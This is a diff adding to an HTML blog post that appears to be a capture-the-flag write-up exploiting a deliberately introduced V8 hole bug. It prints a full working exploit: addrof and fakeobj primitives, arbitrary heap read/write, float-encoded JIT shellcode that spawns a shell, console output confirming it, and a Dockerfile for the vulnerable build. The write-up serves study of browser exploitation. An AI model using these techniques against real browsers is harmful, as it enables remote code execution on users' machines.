@@ -113,7 +113,119 @@ console.log(arr.size) // size is 65535
        </code></pre>
 
        <p>With this corrupted array, we pretty much have free range over the V8 heap, but what can we do here? We will use classic type confusion to create some primitives which achieve arbitrary read and write on the heap. From there we can use <a class="lnk" href="https://en.wikipedia.org/wiki/JIT_spraying">JIT Spraying</a> to achieve arbitrary code execution. One step at a time &#128512;!</p>
+
+       <pre><code>
+
+var float_arr = new Array(1.1, 1.1);
+var object_arr = new Array({}, {});
+
+
+fl_map = ftoi(arr[8]) >> 32n;
+obj_map = ftoi(arr[21]) >> 32n;
+
+off = obj_map - fl_map
+
+console.log("[+] Float Map: " + hex(fl_map));
+console.log("[+] Object Map: " + hex(obj_map));
+
+map_sec_base = fl_map - 0xd9c1n;
+
+console.log("[+] Map Section Base : " + hex(map_sec_base));
+
+function addrof(o) {
+    s = object_arr[0];
+    object_arr[0] = o;
+    arr[21] = itof((fl_map << 32n) + (ftoi(arr[21]) & 0xffffffffn));
+    r = ftoi(object_arr[0]);
+    arr[21] = itof((obj_map << 32n) + (ftoi(arr[21]) & 0xffffffffn));
+    object_arr[0] = s;
+    return r & 0xffffffffn;
+}
+
+function fakeobj(a) {
+    s = float_arr[0];
+    float_arr[0] = itof(a);
+    arr[8] = itof((obj_map << 32n) + (ftoi(arr[8]) & 0xffffffffn));
+    o = float_arr[0];
+    arr[8] = itof((fl_map << 32n) + (ftoi(arr[8]) & 0xffffffffn));
+    float_arr[0] = s;
+    return o;
+}
+       </code></pre>
+
+       <p>At this point I am drawing lots of inspiration from <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" class="lnk">this</a> excellent writeup on Faith's blog. The only difference is that we must manually calculate offsets from our corrupted array. The basic idea is that we can overwrite an array's <code>Map</code> property which stores information about its type and inner workings. This is not to be confused with the actual Map data structure. Basically, we can overwrite an object array's map to a float array map to read the address of the first object in the array. We can overwrite a float array's map with an object array map to create a fake object at the address of the first float in the list. This fake object primitive will help us construct our arbitrary write on the V8 heap. Keep in mind we must perform some bitwise math to deal with pointer compression and tagging. This is another important difference from Faith's writeup. A good explanation of these concepts is written <a href="https://v8.dev/blog/pointer-compression" class="lnk">here</a>. Finally, we are ready to build the read and write primitives.</p>
     
+       <pre><code>
+var fake_arr = [itof(fl_map), 1.1, 1.2, 1.3];
+var fake = fakeobj(addrof(fake_arr) + 0x20n);
+
+function read(a) {
+    p = fake_arr[1];
+    if (a % 2n == 0) {
+        a += 1n;
+    }
+    fake_arr[1] = itof((8n << 32n) + (a - 8n));
+    l = ftoi(fake[0]);
+    fake_arr[1] = p;
+    return l;
+}
+
+function write(a, v) {
+    p = fake_arr[1];
+    if (a % 2n == 0) {
+        a += 1n;
+    }
+    fake_arr[1] = itof((8n << 32n) + (a - 8n));
+    fake[0] = itof(BigInt(v));
+    fake_arr[1] = p;
+}
+       </code></pre>
+
+       <p>In this stage we create a fake float array object on the heap. Each element in <code>fake_arr</code> is interpreted as a float pointer in <code>fake</code>. We use the fake object to read and write from arbitrary locations on the heap. All that is left is to overwrite some JITed code with our shellcode. This method is documented in <a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html" class="lnk">this</a> nice writeup. This is the only reliable method I could find to escape the V8 heap sandbox.</p>
+
+       <pre><code>
+const foo = ()=>
+{
+    return [1.0,
+            1.95538254221075331056310651818E-246,
+            1.95606125582421466942709801013E-246,
+            1.99957147195425773436923756715E-246,
+            1.95337673326740932133292175341E-246,
+            2.63486047652296056448306022844E-284];
+}
+for (let i = 0; i < 0x10000; i++) {foo();foo();foo();foo();}
+for (let i = 0; i < 0x10000; i++) {foo();foo();foo();foo();}
+
+
+faddr = addrof(foo)
+jaddr = read(faddr + 0x18n) & 0xffffffffn;
+code = read(jaddr + 0xcn) + 0x73n;
+
+console.log("[+] JIT Shellcode: " + hex(code));
+
+f = () => 123;
+
+f_code = read(addrof(f) + 0x18n) & 0xffffffffn;
+console.log("[+] Function Code: " + hex(f_code));
+write(f_code + 0xcn, code);
+
+f(); // call our shellcode!
+       </code></pre>
+
+       <p>All together, our exploit launches a shell! The final script is <a href="https://gist.github.com/hoefler02/ea896653ffa751a574aa66121eef3e70" class="lnk">here</a>. Happy browser hacking!</p>
+
+       <pre><code>
+michael@debian:~$ ./d8 pwn.js
+[+] Float Map: 0x18d9c1
+[+] Object Map: 0x18da41
+[+] Map Section Base : 0x180000
+[+] JIT Shellcode: 0x561ea0005273
+[+] Function Code: 0x1467ed
+$ id
+uid=1000(michael) gid=1000(michael) groups=1000(michael)
+       </code></pre>
+
+
     <h2>Helpful Takeaways and Tricks</h2>
 
        <p><i>Helpful Hints:</i> When doing V8 exploitation, it helps to run V8 with the "allow natives syntax" flag, so that you can access special debugging features such as Debug Print! The "shell" flag allows you to run an interactive session! Of course, all of these flags work within <code>gdb</code> or whichever debugger you choose to use.</p>
@@ -128,7 +240,30 @@ d8> %DebugPrint(a)
 d8>
        </code></pre>
 
+       <p>It can also be nice to work with a docker image for challenges like this. The one I used is below.</p>
 
+       <pre><code>
+FROM debian:11.5
+ 
+ARG DEBIAN_FRONTEND=noninteractive
+RUN apt-get update
+RUN apt-get install -y curl git python2 python3 python-is-python3 xz-utils lsb-release sudo \
+pkg-config binutils npm gdb
+RUN git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+RUN echo "export PATH=/depot_tools:$PATH" >> ~/.bashrc
+ENV PATH=/depot_tools:$PATH
+RUN fetch v8
+WORKDIR v8
+RUN git checkout 63cb7fb817e60e5633fb622baf18c59da7a0a682
+RUN gclient sync
+ADD d8_strip_global.patch d8_strip_global.patch
+ADD add_hole.patch add_hole.patch
+RUN git apply d8_strip_global.patch
+RUN git apply add_hole.patch
+RUN tools/dev/gm.py x64.debug
+WORKDIR tools/turbolizer
+RUN npm i && npm run-script build
+       </code></pre>
 
     </body>
 </html>
